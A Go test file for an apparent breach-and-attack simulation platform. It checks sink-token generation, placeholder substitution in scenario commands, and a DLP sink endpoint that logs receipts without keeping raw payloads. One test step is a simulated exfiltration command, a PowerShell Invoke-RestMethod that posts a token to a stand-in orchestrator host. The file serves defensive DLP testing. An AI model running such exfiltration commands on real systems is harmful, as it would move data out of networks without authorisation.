package api

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/audspect/bas/internal/scenario"
	"github.com/audspect/bas/internal/ws"
	"github.com/jackc/pgx/v5/pgxpool"
)

func TestGenerateSinkToken_ProducesUniqueUnpredictableValues(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 100; i++ {
		tok, err := generateSinkToken()
		if err != nil {
			t.Fatalf("generateSinkToken: %v", err)
		}
		if len(tok) < 32 {
			t.Fatalf("token %q too short to be meaningfully unpredictable (crypto/rand, not a timestamp)", tok)
		}
		if seen[tok] {
			t.Fatalf("generateSinkToken produced a duplicate: %q", tok)
		}
		seen[tok] = true
	}
}

func TestIssueSinkTokensAndSubstitute_ReplacesPlaceholdersOnlyWherePresent(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T9999", Command: "Invoke-RestMethod -Uri '{{SINK_URL}}' -Body @{token='{{SINK_TOKEN}}'}"},
			{TechniqueID: "T1052.001", Command: "Copy-Item -Path $src -Destination $dest"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sink-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if strings.Contains(out[0].Command, "{{SINK_TOKEN}}") || strings.Contains(out[0].Command, "{{SINK_URL}}") {
			t.Fatalf("step 0 still has unsubstituted placeholders: %s", out[0].Command)
		}
		if !strings.Contains(out[0].Command, "https://orchestrator.example:9443/api/dlp/sink") {
			t.Fatalf("step 0 command doesn't contain the expected sink URL: %s", out[0].Command)
		}
		if out[1].Command != "Copy-Item -Path $src -Destination $dest" {
			t.Fatalf("step 1 (no placeholder) was modified: %s", out[1].Command)
		}

		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sink-1' AND technique_id = 'T9999'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows for run-sink-1/T9999 = %d, want 1", count)
		}
	})
}

func TestDLPSink_RecordsReceiptForAnyPostedToken(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{
			"token":   "some-token-value",
			"payload": "[BAS-SIM-DLP] fake regulated data",
			"channel": "https-post",
		})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		req.RemoteAddr = "10.0.0.5:54321"
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200, body: %s", rec.Code, rec.Body.String())
		}

		var count int
		var sourceIP, channel string
		var payloadSize int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&count); err != nil {
			t.Fatalf("count receipts: %v", err)
		}
		if count != 1 {
			t.Fatalf("receipt count = %d, want 1", count)
		}
		if err := pool.QueryRow(context.Background(),
			`SELECT source_ip, channel, payload_size FROM dlp_sink_receipts WHERE token = 'some-token-value'`,
		).Scan(&sourceIP, &channel, &payloadSize); err != nil {
			t.Fatalf("read receipt: %v", err)
		}
		if !strings.HasPrefix(sourceIP, "10.0.0.5") {
			t.Errorf("source_ip = %q, want prefix 10.0.0.5", sourceIP)
		}
		if channel != "https-post" {
			t.Errorf("channel = %q, want https-post", channel)
		}
		if payloadSize == 0 {
			t.Error("payload_size should reflect the posted payload's length")
		}

		var rawPayloadStored bool
		rows, _ := pool.Query(context.Background(), `SELECT column_name FROM information_schema.columns WHERE table_name = 'dlp_sink_receipts'`)
		for rows.Next() {
			var col string
			rows.Scan(&col)
			if col == "payload" || col == "raw_payload" {
				rawPayloadStored = true
			}
		}
		rows.Close()
		if rawPayloadStored {
			t.Error("dlp_sink_receipts must never store the raw payload, only a hash -- found a raw-payload column")
		}
	})
}

func TestDLPSink_UnrecognizedTokenStillReturns200(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		body, _ := json.Marshal(map[string]any{"token": "never-issued-token", "payload": "x", "channel": "https-post"})
		req := httptest.NewRequest(http.MethodPost, "/api/dlp/sink", bytes.NewReader(body))
		rec := httptest.NewRecorder()
		h.DLPSink(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("status = %d, want 200 even for an unrecognized token", rec.Code)
		}
	})
}
